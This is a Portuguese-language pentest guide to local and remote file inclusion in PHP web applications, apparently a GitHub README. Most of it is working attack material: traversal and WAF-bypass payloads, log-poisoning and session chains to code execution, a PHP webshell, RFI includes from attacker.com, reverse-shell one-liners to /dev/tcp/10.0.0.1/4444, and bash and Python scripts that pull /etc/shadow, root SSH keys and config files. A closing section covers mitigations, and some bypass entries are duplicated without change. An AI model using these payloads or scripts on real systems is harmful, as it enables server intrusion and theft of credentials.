<!-- =============================================== -->
<!--   LFI & RFI — File Inclusion Vulnerabilities   -->
<!-- =============================================== -->

<p align="center">
  <img src="https://img.shields.io/badge/Category-Web%20Vulnerability-black?style=for-the-badge">
  <img src="https://img.shields.io/badge/Class-File%20Inclusion-red?style=for-the-badge">
  <img src="https://img.shields.io/badge/Impact-Info%20Disclosure%20%7C%20RCE-critical?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/OWASP-A03%3A2021%20Injection-orange?style=flat-square">
  <img src="https://img.shields.io/badge/CWE-CWE--98%20%7C%20CWE--23-informational?style=flat-square">
  <img src="https://img.shields.io/badge/Attack%20Type-LFI%20%7C%20RFI-red?style=flat-square">
  <img src="https://img.shields.io/badge/Focus-Offensive%20Security-black?style=flat-square">
</p>

---

# 📂 LFI (Local File Inclusion) & RFI (Remote File Inclusion)  
## Exploração de Inclusão de Arquivos em Aplicações Web

> Este documento apresenta um **guia técnico e prático sobre vulnerabilidades de File Inclusion**, abordando **LFI (Local File Inclusion)** e **RFI (Remote File Inclusion)** sob a ótica de **segurança ofensiva**, testes de penetração e análise de superfície de ataque em aplicações web.
>
> LFI e RFI continuam entre as falhas mais exploradas em ambientes reais, especialmente em aplicações PHP legadas ou mal configuradas, podendo levar a **vazamento de informações sensíveis**, **bypass de autenticação**, **execução remota de código (RCE)** e **comprometimento total do servidor**.
>
> O material cobre desde os **fundamentos teóricos**, passando por **técnicas clássicas e avançadas de exploração**, **bypasses modernos de WAF**, **encadeamento de falhas (LFI → RCE)**, até **estratégias de mitigação e hardening**.

---

## 🎯 Objetivos do Documento

- Compreender o **funcionamento interno de LFI e RFI**
- Identificar **parâmetros e padrões vulneráveis** em aplicações web
- Explorar **directory traversal**, wrappers PHP e vetores avançados
- Realizar **LFI to RCE** utilizando técnicas como:
  - Log Poisoning
  - PHP Session Inclusion
  - `/proc/self/environ`
  - File Upload chaining
- Aplicar **bypass de filtros e WAF**
- Automatizar a exploração com **scripts e frameworks**
- Entender **detecção, prevenção e mitigação eficaz**

---

## 📌 Escopo Técnico

- **Tipos:** LFI · RFI
- **Impactos:** Information Disclosure · RCE · Privilege Escalation
- **Linguagens Afetadas:** PHP (principal), outras linguagens com include dinâmico
- **Ambientes:** Linux · Windows
- **Contexto:** Web Pentest · Bug Bounty · Red Team
- **Metodologia:** Recon → Enumeração → Exploração → Pós-Exploração

---

## 🏷️ Tags

`#LFI` `#RFI` `#FileInclusion` `#WebSecurity`  
`#WebPentest` `#BugBounty` `#RedTeam`  
`#OWASP` `#RCE` `#PHP` `#OffensiveSecurity`

---

## ⚠️ Aviso Legal

> Este conteúdo é destinado **exclusivamente para fins educacionais**, laboratórios controlados e **ambientes com autorização explícita**.  
> A exploração de vulnerabilidades sem permissão é **ilegal** e pode resultar em consequências legais severas.

---

## Introdução

### Definições

**LFI (Local File Inclusion)**: Vulnerabilidade que permite a um atacante incluir arquivos locais do servidor através de parâmetros manipulados, resultando na leitura de arquivos sensíveis ou execução de código.

![Local File Inclusion](https://1.bp.blogspot.com/-NUU-e676uXs/Xv9omz82qVI/AAAAAAAAlLo/vSy5yplUIvcRKlawwCjrxSGPXrPRHUPRwCLcBGAsYHQ/s1600/1.png)

**RFI (Remote File Inclusion)**: Vulnerabilidade que permite a um atacante incluir arquivos remotos (externos ao servidor), resultando na execução de código arbitrário no servidor.

![Renite File Inclusion](https://miro.medium.com/v2/resize:fit:1400/0*3kzDb3Rrm-ktL6Tg.png)

### Comparação LFI vs RFI

| Característica        | LFI                                 | RFI                                     |
| --------------------- | ----------------------------------- | --------------------------------------- |
| **Origem do arquivo** | Local (servidor)                    | Remota (URL externa)                    |
| **Impacto comum**     | Leitura de arquivos                 | Execução remota de código               |
| **Complexidade**      | Mais comum                          | Menos comum (configurações específicas) |
| **Pré-requisitos**    | Acesso a parâmetros de inclusão     | allow_url_include ativado               |
| **Severidade**        | Média-Alta (dependendo do contexto) | Crítica (RCE direto)                    |

---
## LFI - *Local File Inclusion*

### 1. Fundamentos

#### 1.1 Mecanismo de Funcionamento

O LFI ocorre quando uma aplicação web inclui arquivos sem validação adequada dos inputs do usuário. Exemplo típico em PHP:

```php
<?php
// Vulnerável - não valida o input
$page = $_GET['page'];
include($page . '.php');
?>
```

#### 1.2 Parâmetros Comuns Vulneráveis

```text
page=       file=        document=    folder=
path=       style=       pdf=         template=
pg=         show=        lang=        module=
```

#### 1.3 Exemplo de URL Vulnerável

```text
http://site.com/index.php?page=about
http://site.com/index.php?page=../../../../etc/passwd
```

### 2. Vectores de Ataque

#### 2.1 Directory Traversal

```bash
# Básico
?page=../../../../etc/passwd

# Encodings
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd  # URL encoding
?page=..%2f..%2f..%2fetc%2fpasswd              # URL encoding
?page=....//....//....//etc/passwd             # Double encoding
?page=..\..\..\..\windows\win.ini              # Windows
```

#### 2.2 Null Byte Injection

```bash
# PHP < 5.3.4
?page=../../../etc/passwd%00
?page=../../../etc/passwd%2500  # Double encoding
```

#### 2.3 Path Truncation

```bash
# PHP < 5.3
?page=../../../etc/passwd/././././././.[A x 250]
?page=../../../etc/passwd\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
```

### 3. Técnicas Avançadas

#### 3.1 Log Poisoning

```bash
# 1. Identificar logs acessíveis
/var/log/apache2/access.log
/var/log/httpd/access_log
/proc/self/environ
/proc/self/fd/XX

# 2. Injetar código PHP no User-Agent
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/

# 3. Incluir o log
http://target.com/vuln.php?page=/var/log/apache2/access.log

# 4. Executar comandos
http://target.com/vuln.php?page=/var/log/apache2/access.log&cmd=id
```

#### 3.2 PHP Wrappers

```bash
# php://filter para leitura de arquivos
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/read=convert.base64-encode/resource=/etc/passwd

# php://input para execução de código
POST /vuln.php?page=php://input
Body: <?php system('id'); ?>

# data:// wrapper
?page=data://text/plain,<?php system('id');?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOw==
```

#### 3.3 File Upload + LFI

```bash
# 1. Upload de arquivo com extensão .jpg contendo código PHP
# Conteúdo: <?php system($_GET['cmd']); ?>

# 2. Localizar caminho do upload
/uploads/exploit.jpg

# 3. Incluir via LFI
?page=../../../uploads/exploit.jpg

# 4. Executar comandos
?page=../../../uploads/exploit.jpg&cmd=id
```

#### 3.4 PHP Session Inclusion

```bash
# 1. Localizar sessões
/var/lib/php5/sess_[SESSION_ID]
/tmp/sess_[SESSION_ID]

# 2. Injetar código na sessão
POST /login.php
PHPSESSID=malicious&username=<?php system('id');?>

# 3. Incluir sessão
?page=/tmp/sess_malicious
```

### 4. Exploração Prática

#### 4.1 Script de Exploração Automatizado

```bash
#!/bin/bash
# lfi_explorer.sh

TARGET=$1
PARAM=$2
WORDLIST="/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt"

echo "[*] Testando LFI em: $TARGET"
echo "[*] Parâmetro: $PARAM"
echo ""

# Testes básicos
test_lfi() {
    local url="$1"
    local payload="$2"
    local response=$(curl -s -o /dev/null -w "%{http_code}" "$url")
    
    if [[ $response != "404" && $response != "500" ]]; then
        echo "[+] VULNERÁVEL: $payload"
        echo "    URL: $url"
        curl -s "$url" | head -20
        echo ""
    fi
}

# Testar payloads comuns
payloads=(
    "../../../../etc/passwd"
    "....//....//....//etc/passwd"
    "../../../../etc/hosts"
    "../../../../etc/shadow"
    "../../../../etc/issue"
    "../../../../etc/group"
    "../../../../etc/hostname"
    "../../../../etc/ssh/ssh_config"
    "../../../../root/.ssh/id_rsa"
    "../../../../root/.bash_history"
    "../../../../var/log/auth.log"
    "../../../../var/log/apache2/access.log"
    "../../../../proc/self/environ"
    "php://filter/convert.base64-encode/resource=index.php"
)

for payload in "${payloads[@]}"; do
    url="${TARGET}?${PARAM}=${payload}"
    test_lfi "$url" "$payload"
done

# Usar wordlist
echo "[*] Usando wordlist..."
while read -r payload; do
    url="${TARGET}?${PARAM}=${payload}"
    test_lfi "$url" "$payload"
done < "$WORDLIST"
```

#### 4.2 Exemplo Completo de Ataque

```bash
# 1. Detecção inicial
curl -s "http://target.com/index.php?page=../../../../etc/passwd" | grep -i "root:"

# 2. Leitura de arquivos PHP com base64
curl -s "http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config.php" | base64 -d

# 3. Log poisoning
# Enviar requisição com User-Agent malicioso
curl -A "<?php echo 'VULNERABLE'; system(\$_GET['c']); ?>" http://target.com/

# 4. Incluir log e executar comandos
curl "http://target.com/index.php?page=/var/log/apache2/access.log&c=id"

# 5. Shell reverso
curl "http://target.com/index.php?page=/var/log/apache2/access.log&c=bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
```

---
## RFI - *Remote File Inclusion*

### 5. Fundamentos

#### 5.1 Configurações Necessárias (PHP)

```php
# php.ini configurações perigosas
allow_url_fopen = On      # Permite incluir URLs
allow_url_include = On    # Permite include/require de URLs
```

#### 5.2 Exemplo de Código Vulnerável

```php
<?php
// Extremamente vulnerável
$page = $_GET['page'];
include($page);
?>
```

### 6. Condições Necessárias

1. **PHP Configuration**: `allow_url_include=On`
2. **No Protocol Restrictions**: Não filtrar `http://`, `https://`, `ftp://`
3. **No Validation**: Sem validação de input ou whitelist

### 7. Técnicas de Exploração

#### 7.1 RFI Básico

```bash
# Incluir arquivo remoto
?page=http://attacker.com/shell.txt
?page=https://attacker.com/shell.php
?page=//attacker.com/shell.txt      # Protocolo relativo
?page=\\attacker.com\shell.txt      # Windows UNC path
```

#### 7.2 Bypass de Filtros

**Bypass de "`http://`":**

```bash
?page=http://attacker.com          # Bloqueado
?page=HtTp://attacker.com          # Case variation
?page=http://attacker.com          # Com encoding
?page=////attacker.com/shell.txt   # Protocolo relativo
?page=http:/attacker.com           # Single slash
```

**Bypass com Data URI:**

```bash
?page=data://text/plain,<?php system('id');?>
?page=data:text/plain,<?php system('id');?>
```

**Bypass com PHP Wrapper:**

```bash
?page=php://filter/convert.base64-encode/resource=http://attacker.com/shell.txt
```

#### 7.3 RFI para RCE

**Arquivo remoto (`shell.txt`):**

```php
<?php
// shell.txt no servidor do atacante
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo "RFI Success!";
}
?>
```

**Exploração:**

```bash
# 1. Incluir shell remoto
curl "http://target.com/vuln.php?page=http://attacker.com/shell.txt"

# 2. Executar comandos
curl "http://target.com/vuln.php?page=http://attacker.com/shell.txt&cmd=whoami"

# 3. Shell reverso
curl "http://target.com/vuln.php?page=http://attacker.com/shell.txt&cmd=bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
```

#### 7.4 RFI com SMB (Windows)

```bash
# Compartilhar pasta SMB no Kali
impacket-smbserver share $(pwd) -smb2support

# Incluir via UNC path
?page=\\10.0.0.1\share\shell.php
```

---
## Detecção e Enumeração

### 8. Detecção Manual

```bash
# Testar LFI
curl -s "http://target.com/?page=../../../../etc/passwd" | grep -i "root:"
curl -s "http://target.com/?page=/etc/passwd" | wc -l

# Testar RFI
curl -s "http://target.com/?page=http://google.com" | grep -i "doctype"
curl -I "http://target.com/?page=http://attacker.com/test"

# Verificar erros
curl -s "http://target.com/?page=invalid" | grep -i "warning\|error"

# Fuzzing de parâmetros
ffuf -u "http://target.com/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

### 9. Ferramentas de Detecção

#### 9.1 LFISuite

```bash
git clone https://github.com/D35m0nd142/LFISuite.git
python lfisuite.py -u "http://target.com/page.php?file=" --log-poison
```

#### 9.2 LFI-Enum

```bash
python lfi-enum.py -u "http://target.com/vuln.php?page=" -f /etc/passwd
```

#### 9.3 Burp Suite Intruder

```python
# Wordlist para LFI
<?php include($_GET['page']); ?>
/etc/passwd
../../../../etc/passwd
....//....//....//etc/passwd
/var/www/html/index.php
php://filter/convert.base64-encode/resource=index.php
```

### 10. Enumeração de Arquivos

#### 10.1 Script de Enumeração

```bash
#!/bin/bash
# file_enumerator.sh

URL=$1
PARAM=$2
WORDLIST="/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt"

echo "[*] Enumerando arquivos em: $URL"
echo "[*] Usando parâmetro: $PARAM"
echo ""

while read -r file; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "${URL}?${PARAM}=${file}")
    size=$(curl -s -o /dev/null -w "%{size_download}" "${URL}?${PARAM}=${file}")
    
    if [[ $response == "200" ]] && [[ $size -gt 0 ]]; then
        echo "[+] ENCONTRADO: $file (Size: $size bytes)"
        
        # Tentar ler conteúdo
        if [[ $file == *"passwd"* ]] || [[ $file == *"config"* ]] || [[ $file == *".php"* ]]; then
            content=$(curl -s "${URL}?${PARAM}=${file}" | head -5)
            echo "    Primeiras linhas: $content"
        fi
        echo ""
    fi
    
    # Feedback progressivo
    if (( $((RANDOM % 100)) == 0 )); then
        echo "[*] Progresso: $file"
    fi
done < "$WORDLIST"
```

---
## Exploração Avançada

### 11. LFI para RCE

#### Método 1: Log Poisoning + LFI

```bash
# 1. Configurar servidor para capturar logs
nc -lvnp 80 > access.log

# 2. Enviar requisição com payload
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://target.com/"

# 3. Incluir log via LFI
curl "http://target.com/vuln.php?page=/proc/self/fd/10&cmd=id"

# 4. Shell estável
echo '<?php echo shell_exec($_GET["cmd"]); ?>' | curl -X POST -d @- http://target.com/vuln.php?page=/proc/self/fd/10
```

#### Método 2: PHP Session Inclusion

```bash
# 1. Descobrir local da sessão
curl -s "http://target.com/vuln.php?page=../../../../tmp" | grep -i "sess_"

# 2. Setar sessão maliciosa
curl -H "Cookie: PHPSESSID=malicious" "http://target.com/"
# Enviar POST com payload
curl -X POST -d "username=<?php system('id'); ?>" -H "Cookie: PHPSESSID=malicious" "http://target.com/login.php"

# 3. Incluir sessão
curl "http://target.com/vuln.php?page=../../../../tmp/sess_malicious"
```

#### Método 3: /proc/self/environ

```bash
# 1. Verificar se /proc/self/environ é legível
curl "http://target.com/vuln.php?page=../../../../proc/self/environ"

# 2. Injetar via User-Agent
curl -H "User-Agent: <?php system('id'); ?>" "http://target.com/"

# 3. Incluir e executar
curl "http://target.com/vuln.php?page=../../../../proc/self/environ"
```

### 12. LFI em Aplicações Específicas

#### 12.1 WordPress

```bash
# wp-config.php
?file=../../../wp-config.php

# Logs do WordPress
?file=../../../wp-content/debug.log
?file=../../../wp-content/uploads/access.log
```

#### 12.2 Joomia

```bash
# configuration.php
?file=../../../configuration.php

# Templates
?file=../../../templates/beez/index.php
```

#### 12.3 PHPMyAdmin

```bash
# Config files
?page=../../../../../../usr/share/phpmyadmin/config.inc.php

# Session files
?page=/tmp/sess_[SESSION_ID]
```

### 13. WAF Bypass Techniques

#### 13.1 Bypass de Filtros Comuns

```bash
# Filtro: "../"
?page=....//....//....//etc/passwd
?page=..\/..\/..\/etc/passwd
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Filtro: "etc/passwd"
?page=../../../../etc/./passwd
?page=../../../../etc/passwd%00
?page=/etc/passwd

# Filtro: "http://"
?page=http://attacker.com
?page=HtTp://attacker.com
?page=http://attacker.com
?page=http:/attacker.com
?page=http:/\attacker.com
```

#### 13.2 UTF-8 Bypass

```bash
# Caracteres Unicode
?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
?page=%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc/passwd
```

### 15. Automated Exploitation Framework

```python
#!/usr/bin/env python3
# lfi_rfi_exploit.py

import requests
import sys
import base64
from urllib.parse import quote

class LFIExploiter:
    def __init__(self, url, param):
        self.url = url
        self.param = param
        self.session = requests.Session()
        
    def test_lfi(self, payload):
        """Testa payload LFI específico"""
        test_url = f"{self.url}?{self.param}={payload}"
        try:
            response = self.session.get(test_url, timeout=5)
            
            indicators = [
                "root:x:0:0",
                "mysql:x:",
                "daemon:x:1:",
                "<?php",
                "Warning:",
                "Parse error:"
            ]
            
            for indicator in indicators:
                if indicator in response.text:
                    return True, response.text[:500]
            
            return False, None
            
        except Exception as e:
            return False, str(e)
    
    def read_file(self, filepath):
        """Tenta ler arquivo usando várias técnicas"""
        techniques = [
            f"../../../../{filepath}",
            f"....//....//....//{filepath}",
            f"php://filter/convert.base64-encode/resource={filepath}",
            f"{filepath}%00",
            f"/{filepath}"
        ]
        
        for tech in techniques:
            print(f"[*] Tentando: {tech}")
            success, content = self.test_lfi(tech)
            if success:
                return content
                
        return None
    
    def log_poisoning(self, log_path):
        """Realiza log poisoning attack"""
        # Primeiro, injetar código no log
        payload = "<?php system($_GET['cmd']); ?>"
        headers = {'User-Agent': payload}
        
        try:
            self.session.get(self.url.split('?')[0], headers=headers)
            
            # Agora tentar incluir o log
            lfi_payload = f"{log_path}"
            rce_url = f"{self.url}?{self.param}={lfi_payload}&cmd=id"
            
            response = self.session.get(rce_url)
            if "uid=" in response.text:
                print("[+] Log Poisoning bem-sucedido!")
                return True
                
        except Exception as e:
            print(f"[-] Erro: {e}")
            
        return False

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Uso: {sys.argv[0]} <URL> <parâmetro>")
        sys.exit(1)
    
    exploiter = LFIExploiter(sys.argv[1], sys.argv[2])
    
    # Testar arquivos comuns
    files_to_test = [
        "/etc/passwd",
        "/etc/hosts",
        "/etc/issue",
        "/proc/self/environ",
        "/var/log/apache2/access.log",
        "/var/www/html/index.php"
    ]
    
    for file in files_to_test:
        print(f"\n[*] Tentando ler: {file}")
        content = exploiter.read_file(file)
        if content:
            print(f"[+] Sucesso! Conteúdo:\n{content[:1000]}")
```

---
## Ferramentas e Recursos

### Ferramentas de Detecção

|Ferramenta|Descrição|Comando|
|---|---|---|
|**ffuf**|Fuzzer web rápido|`ffuf -u "http://target/FUZZ" -w lfi_wordlist.txt`|
|**Burp Suite**|Proxy com scanner|Intruder com LFI payloads|
|**Wfuzz**|Fuzzer web|`wfuzz -c -z file,lfi.txt --hc 404 "http://target/?page=FUZZ"`|
|**LFI Suite**|Exploração automatizada|`python lfisuite.py -u "http://target/?file="`|
|**Kadimus**|Scanner LFI|`./kadimus -u "http://target/page.php?file=test"`|

### Wordlists Especializadas

```bash
# SecLists LFI wordlists
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt

# PayloadsAllTheThings
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
```

### Recursos Online

#### Payloads de Test

```bash
# LFI Payloads
../../../etc/passwd
../../../../etc/shadow
....//....//....//etc/passwd
/var/www/html/index.php
php://filter/convert.base64-encode/resource=index.php
/proc/self/environ

# RFI Payloads
http://attacker.com/shell.txt
https://attacker.com/shell.php
//attacker.com/shell.txt
data://text/plain,<?php system('id');?>
```

#### Cheat Sheets

- [LFI Cheat Sheet](https://highon.coffee/blog/lfi-cheat-sheet/)
- [RFI Cheat Sheet](https://www.offsec.com/metasploit-unleashed/file-inclusion-vulnerabilities/)

---
## Prevenção e Mitigação

### 16. Melhores Práticas de Codificação

#### 16.1 PHP - Métodos Seguros

```php
<?php
// 1. Whitelist de arquivos permitidos
$allowed_pages = ['home.php', 'about.php', 'contact.php'];
$page = $_GET['page'];

if(in_array($page, $allowed_pages)) {
    include($page);
} else {
    include('404.php');
}

// 2. Usar basename() - remove directory traversal
$page = basename($_GET['page']);
include("pages/$page.php");

// 3. Validação rigorosa
$page = $_GET['page'];
if(preg_match('/^[a-zA-Z0-9_]+$/', $page)) {
    $file = "pages/{$page}.php";
    if(file_exists($file)) {
        include($file);
    }
}

// 4. Constantes definidas
define('ALLOWED_PAGES', ['home', 'about', 'contact']);
$page = $_GET['page'];

if(defined('ALLOWED_PAGES') && in_array($page, ALLOWED_PAGES)) {
    include("{$page}.php");
}
?>
```

#### 16.2 Configurações do Servidor

```bash
# Apache .htaccess
<FilesMatch "\.(php|php3|php4|php5|phtml|inc)$">
    php_flag allow_url_fopen off
    php_flag allow_url_include off
</FilesMatch>

# Nginx
location ~ \.php$ {
    fastcgi_param PHP_VALUE "allow_url_fopen=0 \n allow_url_include=0";
}
```

### 17. WAF Rules

#### 17.1 ModSecurity Rules

```apache
# Detectar directory traversal
SecRule ARGS_NAMES "@pm file page document include" \
    "id:1001,phase:2,t:urlDecodeUni,t:normalizePath,chain"
SecRule ARGS "@rx \.\./" \
    "msg:'Path Traversal Attack',severity:'CRITICAL'"

# Detectar RFI attempts
SecRule ARGS "@rx (https?|ftps?|php|data):" \
    "id:1002,phase:2,msg:'Remote File Inclusion Attempt'"
```

### 18. Hardening do PHP

```ini
; php.ini seguro
allow_url_fopen = Off
allow_url_include = Off
disable_functions = exec,passthru,shell_exec,system
open_basedir = /var/www/html
expose_php = Off
```

---
## Conclusão

LFI e RFI continuam sendo vulnerabilidades críticas em aplicações web. Embora a prevenção seja relativamente simples através de validação adequada de input, muitos sistemas permanecem vulneráveis devido à má configuração ou código legado.

### **Pontos-Chave:**

1. **LFI** permite leitura de arquivos locais, frequentemente levando a RCE através de técnicas como log poisoning
2. **RFI** é mais perigoso, permitindo execução direta de código remoto, mas requer configurações específicas
3. As **técnicas de bypass** evoluem constantemente, exigindo defesas em camadas
4. A **detecção proativa** através de scanners e testes manuais é essencial
5. A **mitigação adequada** inclui whitelisting, validação rigorosa e configurações seguras do servidor

---
## Referências

### Documentação Oficial

- [OWASP - File Inclusion]([https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion))
- [PortSwigger - File Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [CWE-98: Improper Control of Filename for Include/Require Statement](https://cwe.mitre.org/data/definitions/98.html)

### Artigos Técnicos

- [LFI to RCE via PHP Sessions]([https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/](https://medium.com/@zoningxtr/from-lfi-to-rce-via-php-sessions-php-5-a-complete-guide-with-real-examples-6ced00a1ae10))
- [Log Poisoning to RCE](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1)

### Ferramentas e Recursos

- [SecLists - LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
- [PayloadsAllTheThings - File Inclusion]([https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%2520Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion))
- [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator)

